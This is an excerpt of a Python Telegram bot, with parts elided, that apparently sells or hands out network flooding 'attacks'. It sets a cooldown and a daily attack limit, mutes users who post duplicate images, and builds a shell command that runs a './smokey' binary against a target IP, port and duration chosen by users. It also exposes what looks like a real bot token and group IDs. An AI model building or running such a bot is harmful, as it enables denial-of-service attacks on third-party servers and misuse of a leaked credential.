...
# Bot Token & Group ID
TOKEN = "8038760417:AAGZmbQSN27n3LU-pot_d6RBAI1VErLsYik"  # Replace with actual bot token
CHANNEL_ID = -1002105419629  # Replace with your group/channel ID

# Attack & Cooldown Config
COOLDOWN_DURATION = 60  # 60 sec cooldown
DAILY_ATTACK_LIMIT = 7  # Max daily attacks
EXEMPTED_USERS = [6957116305, 6436350809]  # Users with no cooldown
...
# Handle duplicate image detection and mute user
async def handle_images(update: Update, context: CallbackContext):
    ...
    if update.message.photo:
        ...
        if img_hash in image_hashes:
            mute_duration = 10  # Mute for 15 minutes
            ...
            await update.message.reply_text(
                ...
                f"⏳ Aap {mute_duration} min ke liye mute hain (Until {unmute_time.strftime('%I:%M %p')})."
            )
...
async def run_attack_command_async(target_ip, target_port, duration, chat_id, bot):
    try:
        command = f"./smokey {target_ip} {target_port} {duration} 1600"
